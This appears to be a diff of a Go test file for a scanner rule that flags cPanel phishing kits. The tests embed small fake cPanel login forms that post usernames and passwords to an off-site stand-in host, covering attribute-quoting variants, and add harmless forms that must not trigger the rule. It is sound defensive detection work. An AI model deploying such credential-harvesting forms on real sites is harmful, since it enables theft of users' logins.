@@ -52,13 +52,29 @@ func TestPhishingCPanelLoginRequiresCredentialFormAndOffsiteAction(t *testing.T)
 
 	kit := []byte(`<html><body>
 <h1>cPanel Login</h1>
-<form method="post" action="https://collect.example/cp/post.php">
+<form method="post" action = 'https://collect.example/cp/post.php'>
   <input type="text" name="user">
-  <input type="password" name="pass">
+  <input type = 'password' name="pass">
 </form>
 </body></html>`)
 	if _, hit := scanRepoRulesAs(t, ".html", kit)["phishing_cpanel_login"]; !hit {
 		t.Fatal("cPanel phishing kit posting credentials off-site not detected")
+	}
+
+	unquoted := []byte(`<h1>cPanel Login</h1><form action=https://collect.example/post><input type=password></form>`)
+	if _, hit := scanRepoRulesAs(t, ".html", unquoted)["phishing_cpanel_login"]; !hit {
+		t.Fatal("valid unquoted form attributes bypassed the cPanel phishing rule")
+	}
+
+	for _, legitimate := range [][]byte{
+		[]byte(`<h1>cPanel Login</h1><form action="settings" data-action="https://docs.example/"><input type="password"></form>`),
+		[]byte(`<h1>cPanel Login</h1><form action="https://docs.example/"><div data-type="password"></div></form>`),
+		[]byte(`<h1>cPanel Login</h1><form title="action='https://docs.example/'" action="settings"><input type="password"></form>`),
+		[]byte(`<h1>cPanel Login</h1><form action="https://docs.example/"><input title="type='password'" type="text"></form>`),
+	} {
+		if _, hit := scanRepoRulesAs(t, ".html", legitimate)["phishing_cpanel_login"]; hit {
+			t.Fatalf("pseudo credential attribute triggered cPanel phishing rule: %s", legitimate)
+		}
 	}
 }
 
